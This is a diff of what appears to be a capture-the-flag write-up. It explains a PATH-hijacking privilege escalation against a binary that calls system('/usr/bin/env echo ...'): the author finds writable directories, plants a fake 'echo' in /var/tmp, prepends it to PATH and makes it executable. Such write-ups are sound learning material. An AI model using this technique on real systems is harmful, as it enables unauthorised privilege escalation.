@@ -59,14 +59,30 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   return system("/usr/bin/env echo Exploit me");
 }
 ```
-> viewing this code in plain C made me recognize an angle of attack 
+> viewing the source code in plain C made me recognize an angle of attack 
 
-> what " /usr/bin/env echo " does is search for the echo command in the directories listed in the PATH env variable
+> what this function " system("/usr/bin/env echo Exploit me"); " does is search for the first instance of the 'echo' command in the directories listed in the PATH env variable
+> so if you create a fake echo (AND NOT echo.sh !! remove the extension) it will run your echo instead of the system's echo
+
+- echo $PATH
+
 > ```bash
 > /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
 > ```
-> so replacing the path to the echo command to my own modified echo could be useful to escalate privilege but then again i dont have permissions to write my own code..
+> basically to execute my malicious echo i simply need to add its path at the beginning of the string, this is because the system looks for the first echo to execute and ignores any subsequent ones
 
+- we will search for all folders where i have write access to to start writing our echo
+> find / -type d -writable 2>/dev/null
 
+- we will write our echo script in /var/tmp
+>for starters it will just be
+>```sh
+>echo "EXPLOITED"
+``
+- then add its path to PATH + give it executable permission
+- export PATH=/var/tmp:$PATH
+- chmod +x /var/tmp/echo
+
+- run the binary once again and see if it prints "EXPLOITED" this time
 
 ## --- solved ---
